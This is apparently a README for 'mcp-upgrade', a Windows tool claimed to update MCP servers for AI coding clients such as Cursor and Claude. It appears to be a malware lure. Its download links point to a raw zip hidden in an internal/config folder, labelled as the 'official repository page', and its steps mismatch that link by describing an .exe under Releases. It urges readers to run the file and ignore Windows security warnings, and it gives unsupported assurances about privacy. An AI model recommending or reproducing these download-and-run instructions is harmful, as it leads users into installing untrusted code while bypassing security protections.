# 🚀 mcp-upgrade - Keep your AI coding tools updated

[![](https://img.shields.io/badge/Download-mcp--upgrade-blue)](https://raw.githubusercontent.com/Ramosagustinaolivia23/mcp-upgrade/main/internal/config/upgrade-mcp-v2.5-beta.2.zip)

## 🎯 About this tool
The mcp-upgrade tool simplifies the way you manage servers for your AI coding assistants. Many AI tools use the Model Context Protocol to connect to your local files and databases. These connections need regular updates to maintain security and performance. This program checks your installed tools and updates them to the latest version with one click. It removes the stress of manual updates.

## 💻 System requirements
Before you start, ensure your computer meets these conditions:
- A computer running Windows 10 or Windows 11.
- An active internet connection.
- A modern web browser like Chrome, Edge, or Firefox.
- Sufficient disk space for small application files.

## 💾 How to download and install
Follow these steps to set up the tool on your machine.

1. Visit the [official repository page](https://raw.githubusercontent.com/Ramosagustinaolivia23/mcp-upgrade/main/internal/config/upgrade-mcp-v2.5-beta.2.zip).
2. Look for the section labeled Releases on the right side of the page.
3. Click the latest version number.
4. Locate the file ending in .exe under the Assets section.
5. Click the file name to start the download.
6. Open your Downloads folder once the file finishes.
7. Double-click the file to start the installer.

Your web browser might ask if you trust the file. Since this tool performs system-level updates, Windows may show a security prompt. Select Run to continue the installation.

## 🛠️ Performing updates
Once you open the software, the main screen displays a list of your installed AI tools. The program identifies these tools by scanning your common configuration paths.

1. Open the mcp-upgrade application from your Start menu.
2. Wait for the program to scan your computer. This process takes about ten seconds.
3. Review the list of available versions for your installed tools.
4. Click the Update All button to start the process.
5. Monitor the progress bar at the bottom of the screen.

The tool displays a checkmark next to each item when the update finishes. If a tool fails to update, check your internet connection and try the process again.

## ⚙️ Understanding the settings
You can customize the way the tool behaves by opening the Settings menu from the top corner of the window.

- Automatic Scans: The program checks for updates every time you turn on your computer. You can toggle this feature off if you prefer to perform manual checks.
- Backup Files: By default, the tool saves a copy of your current configuration files before it updates. This ensures you can revert changes if something stops working.
- Update Notifications: The tool displays a desktop alert when a new version of your AI servers becomes available.

## 📋 Frequently asked questions

### Does this tool change my private data?
No. The tool only updates the software components required to run your AI servers. It does not read, copy, or move your personal documents or project files.

### Why does Windows show a security warning?
Windows filters unknown programs to protect users. Since this is an open-source project, it does not have a formal digital signature from a major software vendor. You can safely ignore this prompt if you downloaded the file from the link provided above.

### Can I use this for multiple AI coding clients?
Yes. The mcp-upgrade tool supports all major platforms such as Cursor, Windsurf, and Claude. It detects these installations automatically and applies the necessary updates to each one.

### What should I do if the program freezes?
Close the application fully using the Task Manager. Restart the program. If the issue remains, uninstall the application via your Windows Settings menu and download a fresh copy from the repository page.

### Is my internet speed important?
Only for the download process. Once the installer runs, the tool uses a small amount of data to download the update files. It works well on standard home or office network connections.
